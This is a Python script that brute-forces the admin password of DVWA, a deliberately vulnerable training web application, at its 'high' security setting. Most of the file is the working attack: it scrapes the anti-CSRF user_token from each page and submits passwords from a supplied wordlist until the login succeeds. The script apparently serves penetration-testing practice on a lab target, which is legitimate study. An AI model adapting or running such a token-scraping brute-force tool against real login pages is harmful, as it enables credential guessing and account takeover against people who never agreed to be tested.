import requests
import bs4

#url = 'http://localhost'
#passwordList = '/home/kali/Web/DVWA/list.txt' #'/usr/share/john/password.lst'
url = input('Enter url to DVWA: ') #'http://localhost'
passwordList = input('Enter password list: ')

#DVWA Main Login
param = { 
    'username': 'admin', 
    'password': 'password',
    'Login': 'Login'
    }

res = requests.get(url + '/login.php')
csrfToken = bs4.BeautifulSoup(res.text, 'html.parser').select('input[name="user_token"]')[0]['value']
param['user_token'] = csrfToken
sessionId = res.cookies.get_dict()['PHPSESSID']

cookies = {
    'PHPSESSID': sessionId,
    'security': 'high'
    }

res = requests.post(url + '/login.php', data=param, cookies=cookies)

#bruteforce (security=high)
first = True
with open(passwordList) as f:
    passwords = f.readlines()
    for passwd in passwords:
        passwd = passwd.strip()
        param = {
            'username': 'admin',
            'password': passwd,
            'Login': 'Login'
            }

        if not first:
            csrfToken = bs4.BeautifulSoup(res.text, 'html.parser').select('input[name="user_token"]')[0]['value']
        param['user_token'] = csrfToken

        res = requests.get(url + '/vulnerabilities/brute/index.php', params=param, cookies=cookies)
        if 'Welcome to the password protected area admin' in res.text:
            print(f'Password found for \"admin\": {passwd}')
            exit(0)
        #print(passwd)
        #print('Welcome to the password protected area admin' in res.text)
        first = False
